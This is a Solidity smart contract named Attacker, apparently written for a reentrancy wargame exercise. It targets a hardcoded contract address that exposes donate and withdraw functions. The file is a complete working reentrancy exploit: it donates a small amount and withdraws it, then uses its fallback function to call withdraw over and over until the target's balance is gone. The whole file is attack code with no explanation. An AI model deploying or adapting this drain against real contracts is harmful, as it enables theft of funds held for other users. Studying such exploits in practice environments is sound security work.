// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IReentrancy{
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract Attacker {
    address constant private TARGET_ADDRESS = 0x6e240e7Cca039ee58719012d510Ef7E91a3d2DfB;
    uint256 constant private BALANCE = 0.0005 ether;
    IReentrancy target = IReentrancy(TARGET_ADDRESS);

    function deposit() public payable {
        target.donate{value: BALANCE}(address(this));
        target.withdraw(BALANCE);
    }

    fallback() external payable {
        if( address(target).balance > 0 ){
            target.withdraw(BALANCE);
        }
    }
}